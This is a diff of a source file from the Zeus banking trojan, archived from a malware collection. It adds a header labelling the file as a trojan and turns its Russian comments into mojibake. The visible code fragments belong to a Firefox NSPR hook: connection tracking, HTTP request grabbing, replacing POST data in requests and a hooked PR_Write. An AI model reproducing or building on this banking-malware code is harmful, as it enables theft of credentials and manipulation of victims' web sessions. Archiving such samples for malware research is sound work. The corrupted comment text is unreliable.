@@ -1,3 +1,14 @@
+/*
+  name      Zeus
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    RamadhanAmizudin/malware
+  archived  RamadhanAmizudin, krisyotam (2026)
+  notes     вЂ”
+ */
 #include <windows.h>
 #include <shlobj.h>
 #include <wininet.h>
@@ -125,11 +136,11 @@ static DWORD connectionsCount;
 static CRITICAL_SECTION connectionsCs;
 
 /*
-  Поиск соединенения в таблице.
+  пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 
-  IN fd  - хэндл.
+  IN fd  - пїЅпїЅпїЅпїЅпїЅ.
 
-  Return - индекс соединения в таблице, или (DWORD)-1 если не найдено.
+  Return - пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅ (DWORD)-1 пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 */
 static DWORD connectionFind(const PRFILEDESC *fd)
 {
@@ -138,11 +149,11 @@ static DWORD connectionFind(const PRFILEDESC *fd)
 }
 
 /*
-  Добавление соединения в таблицу.
+  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 
-  IN fd  - хэндл.
+  IN fd  - пїЅпїЅпїЅпїЅпїЅ.
 
-  Return - индекс соединения в таблице, или (DWORD)-1 если не найдено.
+  Return - пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅ (DWORD)-1 пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 */
 static DWORD connectionAdd(const PRFILEDESC *fd)
 {
@@ -183,9 +194,9 @@ static DWORD connectionAdd(const PRFILEDESC *fd)
 }
 
 /*
-  Удаление соединения из таблицы.
+  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 
-  IN index - индекс соединения.
+  IN index - пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 */
 static void connectionRemove(DWORD index)
 {
@@ -217,21 +228,21 @@ static void connectionRemove(DWORD index)
 
 //////////////////////////////////////////////////// ////////////////////////////////////////////////
 /*
-  Кэлбэк enumProfiles().
+  пїЅпїЅпїЅпїЅпїЅпїЅ enumProfiles().
 
-  IN path  - полный путь профиля.
-  IN param - произволный параметр.
+  IN path  - пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
+  IN param - пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 
-  Return   - true - для продолжения поиска,
-             false - для прерывания поиска.
+  Return   - true - пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ,
+             false - пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
 */
 typedef bool (ENUMPROFILESPROC)(const LPWSTR path, void *param);
 
 /*
-  Перечелсение всех профилей текущего юзера.
+  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ.
 
-  IN proc  - кэллбэк.
-  IN param - произволный параметр для кээлбэка.
+  IN proc  - пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
+  IN param - пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 */
 static void enumProfiles(ENUMPROFILESPROC proc, void *param)
 {
@@ -391,15 +402,15 @@ void Nspr4Hook::updateAddresses(HMODULE moduleHandle, void *openTcpSocket, void 
 //////////////////////////////////////////////////// ////////////////////////////////////////////////
 
 /*
-  Заполнение HttpGrabber::REQUESTDATA.
+  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ HttpGrabber::REQUESTDATA.
 
-  OUT requestData - структура. Если (requestData->handle == NULL) запрос нужно проигнорировать.
-  IN fd           - хэндл запроса.
-  IN data         - данные.
-  IN dataSize     - размер данных.
+  OUT requestData - пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ. пїЅпїЅпїЅпїЅ (requestData->handle == NULL) пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
+  IN fd           - пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
+  IN data         - пїЅпїЅпїЅпїЅпїЅпїЅ.
+  IN dataSize     - пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
 
-  Return          -  кол. байт, через котороу нужно начать обрабатывать следущий запрос,
-                    (DWORD)-1 - в случаи ошибки, дальнейший парсинг соединения делать нельзя.
+  Return          -  пїЅпїЅпїЅ. пїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ,
+                    (DWORD)-1 - пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
 */
 static DWORD fillRequestData(HttpGrabber::REQUESTDATA *requestData, const PRFILEDESC *fd, const void *data, DWORD dataSize)
 {
@@ -472,7 +483,7 @@ static DWORD fillRequestData(HttpGrabber::REQUESTDATA *requestData, const PRFILE
         schemeSize = 8;
       }
 
-      requestData->url = (LPSTR)Mem::alloc(8/*scheme*/ + hostSize + 1/*слеш*/ + uriSize);
+      requestData->url = (LPSTR)Mem::alloc(8/*scheme*/ + hostSize + 1/*пїЅпїЅпїЅпїЅ*/ + uriSize);
       if(requestData->url == NULL)return bytesToSkip;
       
       //Scheme
@@ -539,16 +550,16 @@ static DWORD fillRequestData(HttpGrabber::REQUESTDATA *requestData, const PRFILE
 }
 
 /*
-  Подмена POST-данных в запросе.
+  пїЅпїЅпїЅпїЅпїЅпїЅпїЅ POST-пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 
-  IN originalRequest     - оригинальный HTTP-запрос.
-  IN originalRequestSize - размер originalRequest.
-  IN newPostData         - новые POST-данные.
-  IN newPostDataSize     - размер newPostData.
-  OUT newRequest         - новый HTTP-запрос. Нужно освободить через Mem.
+  IN originalRequest     - пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ HTTP-пїЅпїЅпїЅпїЅпїЅпїЅ.
+  IN originalRequestSize - пїЅпїЅпїЅпїЅпїЅпїЅ originalRequest.
+  IN newPostData         - пїЅпїЅпїЅпїЅпїЅ POST-пїЅпїЅпїЅпїЅпїЅпїЅ.
+  IN newPostDataSize     - пїЅпїЅпїЅпїЅпїЅпїЅ newPostData.
+  OUT newRequest         - пїЅпїЅпїЅпїЅпїЅ HTTP-пїЅпїЅпїЅпїЅпїЅпїЅ. пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ Mem.
   
-  Return                 - размер нового HTTP-запроса,
-                           0 - в случаи ошибки.
+  Return                 - пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ HTTP-пїЅпїЅпїЅпїЅпїЅпїЅпїЅ,
+                           0 - пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
 */
 static DWORD replacePostData(const void *originalRequest, DWORD originalRequestSize, const void *newPostData, DWORD newPostDataSize, void **newRequest)
 {
@@ -623,16 +634,16 @@ typedef struct
 }HTTPREQUESTINFO;
 
 /*
-  Анализ HTTP-заголовка.
+  пїЅпїЅпїЅпїЅпїЅпїЅ HTTP-пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 
-  OUT info       - данные.
-  IN request     - запрос.
-  IN requestSize - размер request.
+  OUT info       - пїЅпїЅпїЅпїЅпїЅпїЅ.
+  IN request     - пїЅпїЅпїЅпїЅпїЅпїЅ.
+  IN requestSize - пїЅпїЅпїЅпїЅпїЅпїЅ request.
   
   
-  Return         -  1 - заголовок прочитан,
-                    0 - заголовок еще не прочитан.
-                   -1 - ошибка/ответ не интересен
+  Return         -  1 - пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ,
+                    0 - пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
+                   -1 - пїЅпїЅпїЅпїЅпїЅпїЅ/пїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 */
 static int analizeHttpResponse(HTTPREQUESTINFO *info, const void *request, DWORD requestSize)
 {
@@ -726,18 +737,18 @@ static int analizeHttpResponse(HTTPREQUESTINFO *info, const void *request, DWORD
 }
 
 /*
-  Анналлиз контента.
+  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
   
-  IN OUT info     - данные.
-  IN request      - запрос.
-  IN requestSize  - размер request.
-  IN isClose      - true - получено событие Close от сервера.
-  OUT content     - контент. Выделяется только при возращении 1.
-  OUT contentSize - размер content.
+  IN OUT info     - пїЅпїЅпїЅпїЅпїЅпїЅ.
+  IN request      - пїЅпїЅпїЅпїЅпїЅпїЅ.
+  IN requestSize  - пїЅпїЅпїЅпїЅпїЅпїЅ request.
+  IN isClose      - true - пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ Close пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
+  OUT content     - пїЅпїЅпїЅпїЅпїЅпїЅпїЅ. пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ 1.
+  OUT contentSize - пїЅпїЅпїЅпїЅпїЅпїЅ content.
 
-  Return          -  1 - контент прочитан,
-                     0 - контент еще не прочитан.
-                    -1 - ошибка/ответ не интересен
+  Return          -  1 - пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ,
+                     0 - пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
+                    -1 - пїЅпїЅпїЅпїЅпїЅпїЅ/пїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 */
 static int analizeHttpResponseBody(HTTPREQUESTINFO *info, const LPBYTE buffer, DWORD bufferSize, bool isClose, void **content, LPDWORD contentSize)
 {
@@ -1076,7 +1087,7 @@ __int32 __cdecl Nspr4Hook::hookerPrWrite(void *fd, const void *buf, __int32 amou
   if(Core::isActive() && buf != NULL && amount > 0)
   {
     /*
-      Я просто охуел писать этот алгоритм.
+      пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
     */
     CWA(kernel32, EnterCriticalSection)(&connectionsCs);
     DWORD connectionIndex = connectionFind((PRFILEDESC *)fd);
